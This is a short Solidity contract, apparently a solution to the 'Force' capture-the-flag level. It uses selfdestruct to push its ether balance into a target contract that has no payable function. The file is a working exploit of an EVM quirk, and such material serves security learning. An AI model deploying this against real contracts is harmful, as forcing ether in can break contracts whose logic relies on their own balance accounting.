// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Force.sol";

contract ForceAttacker {
  using SafeMath for uint256;
  address payable target;

  constructor(address payable _target) public payable {
    target = _target;
  }

  function attack() public {
    selfdestruct(target);
  }

  receive() external payable {}
}
